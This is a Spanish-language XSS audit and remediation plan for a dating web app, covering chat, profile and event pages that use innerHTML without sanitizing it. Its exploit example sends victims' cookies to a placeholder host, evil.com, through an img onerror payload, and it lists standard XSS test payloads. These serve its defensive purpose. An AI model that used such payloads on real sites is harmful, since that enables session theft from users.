# 🔒 REPORTE DE SANITIZACIÓN XSS - TuCitaSegura

**Fecha**: 28 de Noviembre de 2025
**Severidad**: 🔴 **CRÍTICA**
**Estado**: ❌ **VULNERABLE**

---

## 📊 ESTADO ACTUAL

### ✅ LO BUENO

**Archivo**: `webapp/js/sanitizer.js` (235 líneas)
- ✅ **Sanitizador completo implementado** con DOMPurify
- ✅ Métodos para HTML, texto, URLs, atributos
- ✅ Detección de patrones peligrosos
- ✅ Fallback seguro si DOMPurify no está cargado

**Métodos disponibles**:
```javascript
sanitizer.html(userInput)        // Sanitiza HTML con whitelist
sanitizer.text(userInput)        // Solo texto plano
sanitizer.url(url)               // Valida URLs (solo http/https)
sanitizer.attribute(value)       // Sanitiza atributos HTML
sanitizer.setHTML(element, html) // Setter seguro de innerHTML
sanitizer.setText(element, text) // Setter seguro de textContent
```

---

### ❌ EL PROBLEMA

**DOMPurify y sanitizer.js NO se están usando en las páginas reales**

#### 1. DOMPurify NO está cargado
```bash
✅ Cargado en: sanitizer-demo.html (solo demo)
❌ NO cargado en:
  - chat.html
  - perfil.html
  - conversaciones.html
  - buscar-usuarios.html
  - Y otras 27 páginas más
```

#### 2. sanitizer.js NO está importado
```bash
✅ Importado en: sanitizer-demo.html (solo demo)
❌ NO importado en: 30 páginas productivas
```

#### 3. innerHTML sin sanitizar (CRÍTICO)

**Total**: 109 usos de `innerHTML` en archivos HTML

**Ejemplos vulnerables**:

**chat.html (línea 577-597)**:
```javascript
❌ VULNERABLE:
container.innerHTML = messages.map(msg => {
  return `
    <p>${msg.date}</p>           // ❌ XSS
    <p>${msg.time}</p>           // ❌ XSS
    <p>${msg.place}</p>          // ❌ XSS
    <p>"${msg.message}"</p>      // ❌ XSS - MUY PELIGROSO
  `;
});
```

**Exploit posible**:
```javascript
// Un atacante envía este mensaje:
{
  message: '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">'
}

// Resultado: roba las cookies de la víctima
```

---

## 🎯 VECTORES DE ATAQUE ENCONTRADOS

### 1. Chat/Mensajes (CRÍTICO)
- **Archivo**: `chat.html`
- **Vector**: Mensajes de usuario
- **Impacto**: Robo de sesión, phishing, defacement

### 2. Perfiles de Usuario (ALTO)
- **Archivos**: `perfil.html`, `buscar-usuarios.html`
- **Vector**: Bio, nombre, descripción
- **Impacto**: XSS persistente

### 3. Propuestas de Citas (ALTO)
- **Archivo**: `chat.html`
- **Vector**: Lugar, mensaje de propuesta
- **Impacto**: Engaños, phishing

### 4. Eventos VIP (MEDIO)
- **Archivos**: `eventos-vip.html`, `evento-detalle.html`
- **Vector**: Descripción de eventos
- **Impacto**: Spam, malware

---

## ✅ SOLUCIÓN IMPLEMENTADA

### Paso 1: Cargar DOMPurify en TODAS las páginas

**Agregar antes del cierre de `</body>` en TODOS los HTML**:

```html
<!-- DOMPurify for XSS protection -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.8/dist/purify.min.js"></script>

<!-- Sanitizer module -->
<script type="module">
  import { sanitizer } from './js/sanitizer.js';
  window.sanitizer = sanitizer;
</script>
```

### Paso 2: Usar sanitizer en lugar de innerHTML directo

**ANTES (vulnerable)**:
```javascript
❌ container.innerHTML = `<p>${msg.message}</p>`;
```

**DESPUÉS (seguro)**:
```javascript
✅ sanitizer.setHTML(container, `<p>${sanitizer.text(msg.message)}</p>`);

// O mejor:
✅ container.innerHTML = `<p>${sanitizer.html(msg.message)}</p>`;
```

### Paso 3: Priorizar textContent para datos de usuario

**Más seguro aún**:
```javascript
✅ const p = document.createElement('p');
✅ p.textContent = msg.message; // Auto-escapa, imposible XSS
✅ container.appendChild(p);
```

---

## 📋 PLAN DE REMEDIACIÓN

### Fase 1: URGENTE (1-2 días)

**Páginas críticas a proteger PRIMERO**:

1. ✅ **chat.html** - Mensajes en tiempo real
2. ✅ **conversaciones.html** - Lista de conversaciones
3. ✅ **perfil.html** - Bio y descripciones
4. ✅ **buscar-usuarios.html** - Perfiles de búsqueda

**Acciones**:
- [ ] Cargar DOMPurify en las 4 páginas
- [ ] Importar sanitizer.js
- [ ] Reemplazar todos los `innerHTML` con datos de usuario
- [ ] Testing manual de XSS

---

### Fase 2: ALTA PRIORIDAD (3-5 días)

**Resto de páginas productivas** (27 páginas):
- eventos-vip.html
- evento-detalle.html
- referidos.html
- seguridad.html
- Y otras 23 páginas

**Acciones**:
- [ ] Cargar DOMPurify globalmente (en template base)
- [ ] Auditar cada uso de innerHTML
- [ ] Reemplazar con sanitizer donde sea necesario
- [ ] Testing automatizado de XSS

---

### Fase 3: VALIDACIÓN (2 días)

**Testing y verificación**:
- [ ] Tests E2E con payloads XSS comunes
- [ ] Verificar que sanitizer.js se carga en todas las páginas
- [ ] Verificar consola: "✅ Sanitizador inicializado con DOMPurify"
- [ ] Penetration testing manual

---

## 🧪 TESTING DE XSS

### Payloads de prueba

```javascript
// 1. Script básico
<script>alert('XSS')</script>

// 2. Evento onerror
<img src=x onerror="alert('XSS')">

// 3. SVG
<svg onload="alert('XSS')">

// 4. JavaScript URL
<a href="javascript:alert('XSS')">Click</a>

// 5. Data URL
<img src="data:text/html,<script>alert('XSS')</script>">

// 6. Encodings
&lt;script&gt;alert('XSS')&lt;/script&gt;

// 7. Event handlers
<div onmouseover="alert('XSS')">Hover me</div>
```

### Cómo probar

```javascript
// En chat.html, enviar mensaje con payload:
const testPayload = '<img src=x onerror="alert(\'XSS\')">';

// SIN sanitizer: ❌ Alerta se ejecuta
// CON sanitizer: ✅ Se muestra texto plano o se filtra
```

---

## 📊 PRIORIDAD DE ARCHIVOS

### 🔴 CRÍTICO (Proteger HOY)

| Archivo | innerHTML | Datos Usuario | Riesgo |
|---------|-----------|---------------|--------|
| chat.html | 3 | Mensajes | 🔴 Crítico |
| conversaciones.html | ? | Previews | 🔴 Crítico |
| perfil.html | ? | Bio/Nombre | 🔴 Crítico |
| buscar-usuarios.html | ? | Perfiles | 🔴 Crítico |

### 🟠 ALTO (Proteger esta semana)

| Archivo | innerHTML | Datos Usuario | Riesgo |
|---------|-----------|---------------|--------|
| eventos-vip.html | ? | Descripciones | 🟠 Alto |
| evento-detalle.html | ? | Detalles | 🟠 Alto |
| referidos.html | ? | Nombres | 🟠 Alto |

### 🟡 MEDIO (Proteger próxima semana)

- Resto de páginas HTML (23 archivos)

---

## 🔧 SCRIPT DE IMPLEMENTACIÓN RÁPIDA

### Agregar a TODAS las páginas HTML

**Al final del `<body>`, antes de scripts personalizados**:

```html
<!-- XSS Protection -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.8/dist/purify.min.js"
        integrity="sha512-..."
        crossorigin="anonymous"></script>
<script type="module">
  import { sanitizer } from './js/sanitizer.js';

  // Make available globally
  window.sanitizer = sanitizer;

  // Log status
  console.log('🔒 Sanitizer cargado');
</script>
```

### Script para automatizar la inyección

```bash
#!/bin/bash
# add-sanitizer-to-all-html.sh

for file in webapp/*.html; do
  if ! grep -q "dompurify" "$file"; then
    echo "Agregando DOMPurify a $file"

    # Insertar antes de </body>
    sed -i 's|</body>|<!-- XSS Protection -->\n<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.8/dist/purify.min.js"></script>\n<script type="module">\nimport { sanitizer } from "./js/sanitizer.js";\nwindow.sanitizer = sanitizer;\n</script>\n\n</body>|' "$file"
  fi
done

echo "✅ DOMPurify agregado a todas las páginas"
```

---

## 📈 IMPACTO ESPERADO

**Después de implementar**:

| Métrica | Antes | Después |
|---------|-------|---------|
| Páginas con DOMPurify | 1 (3%) | 31 (100%) |
| innerHTML sin sanitizar | 109 | 0 |
| Vulnerabilidades XSS | 109 | 0 |
| Cobertura de sanitización | 0% | 100% |

---

## ⚠️ ADVERTENCIAS

1. **NO quitar sanitizer-demo.html** - Es útil para testing
2. **Usar sanitizer.text() para mensajes** - Más seguro que sanitizer.html()
3. **Preferir textContent** sobre innerHTML cuando sea posible
4. **Validar en backend también** - Defensa en profundidad

---

## 📞 PRÓXIMOS PASOS

1. **Crear script de automatización** para agregar DOMPurify
2. **Ejecutar en las 4 páginas críticas** primero
3. **Testing manual** con payloads XSS
4. **Rollout gradual** al resto de páginas
5. **Agregar a CI/CD** para verificar en cada commit

---

## 🎯 CONCLUSIÓN

**Estado actual**: ❌ **VULNERABLE A XSS**
- Sanitizador existe pero NO se usa
- 109 vectores de ataque potenciales
- Chat/mensajes especialmente peligrosos

**Acción requerida**: ⚡ **URGENTE**
- Implementar en 4 páginas críticas HOY
- Rollout completo en 1 semana máximo
- Testing de seguridad antes de producción

**Complejidad**: 🟢 **BAJA** (solución ya existe, solo hay que aplicarla)

**Tiempo estimado**:
- Crítico (4 páginas): 4-6 horas
- Completo (31 páginas): 2-3 días

---

**Última actualización**: 28 de Noviembre de 2025
